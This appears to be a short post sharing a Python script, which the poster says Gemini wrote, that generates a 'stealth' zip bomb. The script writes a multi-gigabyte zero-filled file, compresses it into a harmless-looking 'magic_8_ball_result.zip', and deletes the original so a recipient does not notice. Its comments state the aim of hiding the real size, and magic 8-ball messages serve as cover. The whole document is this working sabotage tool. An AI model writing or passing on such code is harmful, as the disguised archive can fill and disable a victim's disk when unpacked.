#I find this so funny for some reason gemini got mixed up with my 2 projects and added a magic 8 ball so yea now the 8 ball does it.





import zipfile
import os
import time
from pathlib import Path
import random

def magic_8_ball_animation():
    # The spinner you asked for
    spinner = ["|", "/", "-", "\\"]
    responses = ["Concentrating...", "Shaking the data...", "Consulting the stars...", "Reading the bits..."]
    
    print(f"Magic 8-Ball: {random.choice(responses)}")
    for _ in range(15):
        for char in spinner:
            print(f"\r  [{char}] COMPILING [{char}]", end="")
            time.sleep(0.05)
    print("\n")

def create_stealth_bomb():
    # 1. Ask for size
    try:
        target_gb = float(input("Enter desired unzipped size in GB: "))
    except: return

    desktop = Path.home() / "Desktop"
    # The hidden heavy file (temp)
    temp_large_file = desktop / "data_temp.txt"
    # The final innocent-looking zip
    final_zip = desktop / "magic_8_ball_result.zip"

    # 2. Start Animation
    magic_8_ball_animation()

    # 3. Create the massive data stream (10MB chunks)
    # This creates the 'One Big File'
    chunk = b"0" * (10 * 1024 * 1024)
    num_chunks = int(target_gb * 102.4)

    print(f"Building {target_gb}GB logical volume...")
    
    try:
        # Step A: Create the large file temporarily
        with open(temp_large_file, "wb") as f:
            for i in range(num_chunks):
                f.write(chunk)
                if i % 100 == 0:
                    print(f"Progress: {int((i/num_chunks)*100)}%", end="\r")

        # Step B: Zip it once it is finished
        print("\nWrapping in stealth ZIP...")
        with zipfile.ZipFile(final_zip, 'w', zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
            # We add the massive file into the zip
            zf.write(temp_large_file, "ULTRA_DATA.txt")

        # Step C: DELETE the massive file so they don't see it
        # This leaves ONLY the small zip file behind
        os.remove(temp_large_file)

        # Final 8-ball answer
        answers = ["It is certain.", "Outcome looks... big.", "Signs point to YES.", "You may rely on it."]
        
        print("\n" + "="*30)
        print(f"8-BALL SAYS: {random.choice(answers)}")
        print(f"Final File: {final_zip.name}")
        print(f"Zipped Size: {os.path.getsize(final_zip) / (1024*1024):.2f} MiB")
        print(f"Secret Content: {target_gb} GB")
        print("="*30)

    except Exception as e:
        print(f"Error: {e}")
        if temp_large_file.exists():
            os.remove(temp_large_file)

if __name__ == "__main__":
    create_stealth_bomb()
